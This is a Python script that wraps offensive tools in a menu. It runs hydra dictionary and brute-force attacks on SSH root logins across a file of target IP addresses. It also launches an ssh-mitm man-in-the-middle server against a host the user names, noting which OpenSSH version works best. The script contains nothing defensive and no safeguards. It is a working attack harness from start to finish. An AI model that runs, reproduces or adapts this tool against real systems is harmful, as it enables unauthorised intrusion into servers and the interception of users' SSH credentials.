import glob
import subprocess

while True:
    user_choice = input(
        "\nSelect option:\n"
        "1. Launch dictionary attack & brute force\n"
        "2. Launch man-in-the-middle attack\n"
        "3. Print targets\n"
        "4. Feed Targets for dict. attack\n"
        "5. Exit \n"
        "> "
    )

    if user_choice == "1":
        for wordlist in sorted(glob.glob("passwords/hydra_split_*.txt")):
            print(f"\nRunning with {wordlist}...")

            cmd = [
                "hydra",
                "-l", "root",
                "-P", wordlist,
                "-M", "targets/ips.txt",
                "ssh", "-o", "output.txt"
            ]

            
            with subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
            ) as p:
                for line in p.stdout:
                    print(line, end="")
                p.wait()

                print(f"{wordlist} finished with return code {p.returncode}")

    elif user_choice == "2":
        print("starting MITM.... USE WITH OpenSSH v7.5p1 FOR BEST RESULTS")
        appimage_path = "mitm/./ssh-mitm-x86_64.AppImage"
        mitmChoice = input("TARGET-HOST:")
        command = [appimage_path, "server", "--remote-host", mitmChoice]
        try:
            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,  
                start_new_session=True  
            )
            print(f"Started SSH-MITM with PID: {process.pid}")

            for line in iter(process.stdout.readline, ''):
                print(f"Output: {line.strip()}")
        
            process.wait()

        except subprocess.CalledProcessError as e:
            print(f"An error occurred: {e}")

    elif user_choice == "3":
        with open("targets/ips.txt", "r") as f:
            lines = f.readlines()

            ipCount = len(lines)
            content = "".join(lines)

            print(f"Target Count: {ipCount}")
            print(content)

    elif user_choice == "5":
        print("Exiting program.")
        break  
    elif user_choice == "4":
        user_text = input('ENTER TARGET IP WITH SSH:')
        with open("targets/ips.txt", "a") as f:
            f.write(user_text + "\n")
            print("target",user_text, "added")
    else:
        print("Wrong Input...try again.")